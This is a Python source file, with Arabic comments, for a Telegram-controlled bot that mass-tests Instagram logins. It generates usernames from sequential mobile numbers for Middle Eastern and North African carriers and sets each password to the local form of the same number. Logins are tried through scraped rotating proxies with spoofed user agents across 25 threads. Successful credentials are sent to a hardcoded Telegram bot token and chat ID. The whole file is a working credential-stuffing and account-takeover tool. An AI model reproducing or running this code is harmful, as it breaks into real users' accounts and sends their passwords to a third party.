import random
import requests
import pyfiglet
from user_agent import generate_user_agent
import os
import time
import threading
from collections import deque
import sys
import json
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from flask import Flask

# --- إعداد خادم الويب لإبقاء الخدمة مستيقظة ---
app = Flask(__name__)
@app.route('/')
def hello_world():
    return 'Bot is running!'
def run_flask():
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
# -------------------------------------------------

# +++++++++++++++++++++++++++++++++++++++++++++++++
# ++++++++++ التوكن والـ ID المضافان +++++++++++++
# +++++++++++++++++++++++++++++++++++++++++++++++++
TOKEN = "1936058114:AAHm19u1R6lv_vShGio-MIo4Z0rjVUoew_U"
CHAT_ID = "1148797883"
# +++++++++++++++++++++++++++++++++++++++++++++++++
# +++++++++++++++++++++++++++++++++++++++++++++++++

# --- متغيرات الحالة والتحكم ---
is_running = False
current_network_choice = None
main_process_thread = None
data_lock = threading.Lock()
STATE_FILE = "hunter_state.json"

# --- قوائم وإحصائيات مشتركة ---
proxies_to_check = deque()
good_proxies = deque()
active_hunters_count = 0
total_proxies_in_batch = 0
checked_proxies_count = 0
found_accounts = 0
failed_attempts = 0
last_event = "Tool is Ready..."
start_time = 0

# --- القواميس الرئيسية للإعدادات مع نقاط بداية قديمة ---
network_configs = {
    # 8 digits networks (start from 11,000,000)
    '1': {'country_code': '964', 'operator_code': '77', 'digits': 8, 'start_point': 11000000},
    '2': {'country_code': '964', 'operator_code': '78', 'digits': 8, 'start_point': 11000000},
    '5': {'country_code': '98', 'operator_code': '91', 'digits': 8, 'start_point': 11000000},
    '6': {'country_code': '98', 'operator_code': '93', 'digits': 8, 'start_point': 11000000},
    '11': {'country_code': '20', 'operator_code': '10', 'digits': 8, 'start_point': 11000000},
    '12': {'country_code': '20', 'operator_code': '12', 'digits': 8, 'start_point': 11000000},
    '13': {'country_code': '20', 'operator_code': '11', 'digits': 8, 'start_point': 11000000},
    '14': {'country_code': '20', 'operator_code': '15', 'digits': 8, 'start_point': 11000000},
    # 7 digits networks (start from 2,100,000)
    '3': {'country_code': '218', 'operator_code': '91', 'digits': 7, 'start_point': 2100000},
    '4': {'country_code': '218', 'operator_code': '92', 'digits': 7, 'start_point': 2100000},
    '7': {'country_code': '965', 'operator_code': '9', 'digits': 7, 'start_point': 2100000},
    '8': {'country_code': '965', 'operator_code': '6', 'digits': 7, 'start_point': 2100000},
    '9': {'country_code': '974', 'operator_code': '5', 'digits': 7, 'start_point': 2100000},
    '10': {'country_code': '974', 'operator_code': '7', 'digits': 7, 'start_point': 2100000},
}
network_map = {
    '1': "Asia (Iraq)", '2': "Zain (Iraq)", '3': "Libyana (Libya)", '4': "Almadar (Libya)", '5': "MCI (Iran)", '6': "Irancell (Iran)",
    '7': "Zain (Kuwait)", '8': "Ooredoo (Kuwait)", '9': "Ooredoo (Qatar)", '10': "Vodafone (Qatar)", '11': "Vodafone (Egypt)",
    '12': "Orange (Egypt)", '13': "Etisalat (Egypt)", '14': "WE (Egypt)"
}

# --- دوال حفظ واستعادة الحالة ---
def load_state():
    if os.path.exists(STATE_FILE):
        with open(STATE_FILE, 'r') as f:
            try:
                return json.load(f)
            except json.JSONDecodeError:
                return {}
    return {}

def save_state(state):
    with open(STATE_FILE, 'w') as f:
        json.dump(state, f, indent=4)

# --- دوال الأداة الأساسية ---
def fetch_proxies():
    global total_proxies_in_batch, checked_proxies_count, last_event
    last_event = "Updating proxy list from sources..."
    
    proxy_sources = [
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt"
    ]
    
    all_new_proxies = set()

    for url in proxy_sources:
        try:
            response = requests.get(url, timeout=20)
            if response.status_code == 200:
                proxies_from_source = {p for p in response.text.strip().splitlines() if p}
                all_new_proxies.update(proxies_from_source)
        except Exception:
            pass

    if all_new_proxies:
        with data_lock:
            proxies_to_check.clear(); good_proxies.clear()
            proxies_to_check.extend(list(all_new_proxies))
            total_proxies_in_batch = len(all_new_proxies)
            checked_proxies_count = 0
        last_event = f"Fetched {len(all_new_proxies)} unique proxies from {len(proxy_sources)} sources."
        return True
    else:
        last_event = "Failed to fetch proxies from all sources."
        return False

def send_hit_message(username, password, network_type):
    global last_event
    network_name = network_map.get(network_type, "Unknown")
    message = (f"💎✨ New Hit Found! ✨💎\n- - - - - - - - - - - - - - - - - -\n👤 **Username:**\n`{username}`\n\n🔑 **Password:**\n`{password}`\n- - - - - - - - - - - - - - - - - -\n💻 **Network:** {network_name}\n- - - - - - - - - - - - - - - - - -\n🤖 By: Al-Sayed Mahdi [@mmllxxss]")
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={message}&parse_mode=Markdown"
    try:
        requests.post(url, timeout=10)
        last_event = f"Sent {username} to Telegram."
    except Exception as e:
        last_event = f"Telegram send error: {e}"

def check_single_proxy(proxy):
    global checked_proxies_count
    test_url = "https://www.instagram.com"
    proxy_to_use = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
    try:
        response = requests.get(test_url, proxies=proxy_to_use, timeout=7)
        if response.status_code == 200:
            with data_lock: checked_proxies_count += 1
            return proxy
    except: pass
    with data_lock: checked_proxies_count += 1
    return None

def filter_worker():
    while True:
        if not is_running:
            time.sleep(5)
            continue
        proxy_to_test = None
        with data_lock:
            if proxies_to_check: proxy_to_test = proxies_to_check.popleft()
        if proxy_to_test:
            result = check_single_proxy(proxy_to_test)
            if result:
                with data_lock: good_proxies.append(result)
        else: time.sleep(5)

def check_instagram_account(username, password, active_proxy, network_type):
    global found_accounts, failed_attempts, last_event
    url = "https://www.instagram.com/accounts/login/ajax/"
    headers = {'user-agent': generate_user_agent()}
    data = {'username': username, 'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1589682409:{password}'}
    proxy_to_use = {'http': f'http://{active_proxy}', 'https': f'http://{active_proxy}'}
    try:
        with requests.Session() as s:
            response = s.post(url, headers=headers, data=data, proxies=proxy_to_use, timeout=10)
            if 'userId' in response.text:
                with data_lock:
                    found_accounts += 1
                    last_event = f"Hit Found: {username}"
                send_hit_message(username, password, network_type)
            else:
                with data_lock: failed_attempts += 1
            return True
    except: return False

def hunt_worker(choice):
    global last_event, active_hunters_count
    config = network_configs[choice]
    
    state = load_state()
    counter = state.get(choice, config['start_point'])

    while True:
        if not is_running:
            time.sleep(5)
            continue
        
        active_proxy = None
        with data_lock:
            if good_proxies:
                active_proxy = good_proxies.popleft()
                active_hunters_count += 1
        
        if active_proxy:
            while is_running:
                random_part = str(counter).zfill(config['digits'])
                username = config['country_code'] + config['operator_code'] + random_part
                password = '0' + config['operator_code'] + random_part
                
                is_proxy_ok = check_instagram_account(username, password, active_proxy, choice)
                
                counter += 1
                if counter % 10 == 0:
                    with data_lock:
                        current_state = load_state()
                        current_state[choice] = counter
                        save_state(current_state)

                if not is_proxy_ok:
                    with data_lock:
                        last_event = f"Proxy burned: {active_proxy}"
                        active_hunters_count -= 1
                    break
            
            if not is_running:
                with data_lock:
                    good_proxies.appendleft(active_proxy)
                    active_hunters_count -= 1
        else:
            time.sleep(3)

def main_process(choice, num_filter, num_hunter):
    global start_time
    start_time = time.time()
    
    for _ in range(num_filter): threading.Thread(target=filter_worker, daemon=True).start()
    for _ in range(num_hunter): threading.Thread(target=hunt_worker, args=(choice,), daemon=True).start()
    
    while is_running:
        with data_lock:
            no_proxies_to_check = not proxies_to_check
            no_good_proxies = not good_proxies
        if no_proxies_to_check and no_good_proxies:
            if not fetch_proxies():
                time.sleep(60)
        time.sleep(5)

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if str(user_id) != CHAT_ID:
        await update.message.reply_text("You are not authorized to use this bot.")
        return

    global is_running
    if is_running:
        await update.message.reply_text("⚠️ Tool is already running.")
        return
        
    keyboard = [[name] for name in network_map.values()]
    reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=True, resize_keyboard=True)
    await update.message.reply_text('Welcome, Sayed Mahdi. Choose a network to target:', reply_markup=reply_markup)

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if str(user_id) != CHAT_ID: return

    global is_running, main_process_thread
    if not is_running:
        await update.message.reply_text("⚠️ Tool is already stopped.")
        return
    
    is_running = False
    if main_process_thread:
        main_process_thread.join(timeout=5)
    await update.message.reply_text("✅ Tool stopped. All processes will halt shortly.")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if str(user_id) != CHAT_ID: return

    if not is_running:
        await update.message.reply_text(f"Tool is stopped.\nLast Event: {last_event}")
        return

    with data_lock:
        total, checked, inventory = total_proxies_in_batch, checked_proxies_count, len(good_proxies)
        found, failed = found_accounts, failed_attempts
        event = last_event
        active_count = active_hunters_count
    
    percentage = (checked / total * 100) if total > 0 else 0
    total_attempts = found + failed
    speed = total_attempts / (time.time() - start_time) if (time.time() - start_time) > 0 else 0
    network_name = network_map.get(current_network_choice, "N/A")

    status_msg = (
        f"📊 **Tool Status** 📊\n"
        f"--------------------------------\n"
        f"🏃‍♂️ **State:** Running\n"
        f"🎯 **Target:** {network_name}\n"
        f"--------------------------------\n"
        f"🔎 **Filtering:** {checked}/{total} ({percentage:.1f}%)\n"
        f"🔋 **Inventory:** {inventory} proxies ready\n"
        f"🏹 **Hunters:** {active_count}/25 active\n"
        f"--------------------------------\n"
        f"✅ **Hits:** {found}\n"
        f"❌ **Fails:** {failed}\n"
        f"⚡️ **Speed:** {speed:.1f} att/sec\n"
        f"--------------------------------\n"
        f"💬 **Last Event:** {event}"
    )
    await update.message.reply_text(status_msg, parse_mode='Markdown')

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if str(user_id) != CHAT_ID: return

    global is_running, current_network_choice, main_process_thread
    if is_running:
        await update.message.reply_text("Tool is already running. Send /stop first to start a new task.")
        return

    text = update.message.text
    chosen_key = None
    for key, name in network_map.items():
        if name == text:
            chosen_key = key
            break
    
    if chosen_key:
        is_running = True
        current_network_choice = chosen_key
        await update.message.reply_text(f"✅ Starting with MAX POWER! Targeting network: {text}", reply_markup={'remove_keyboard': True})
        
        # +++ تم رفع قوة العمال هنا +++
        num_filter_workers = 50
        num_hunt_workers = 25
        # +++++++++++++++++++++++++++++
        
        main_process_thread = threading.Thread(target=main_process, args=(chosen_key, num_filter_workers, num_hunt_workers), daemon=True)
        main_process_thread.start()
    else:
        await update.message.reply_text("Unknown option. Please use /start and choose from the keyboard.")

def run_bot():
    if not TOKEN or not CHAT_ID:
        print("FATAL ERROR: Please put your TELEGRAM_TOKEN and TELEGRAM_CHAT_ID at the top of the file.")
        return
        
    print("Control Bot is starting...")
    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print("Control Bot is up and running...")
    application.run_polling()

if __name__ == "__main__":
    # تشغيل خادم الويب في خيط منفصل
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()

    # تشغيل البوت في الخيط الرئيسي
    run_bot()
